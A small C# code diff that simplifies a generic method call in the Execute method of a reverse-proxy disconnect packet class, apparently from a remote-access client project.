@@ -20,7 +20,7 @@ namespace xClient.Core.ReverseProxy.Packets
 
         public void Execute(Client client)
         {
-            client.Send<ReverseProxyDisconnect>(this);
+            client.Send(this);
         }
     }
 }
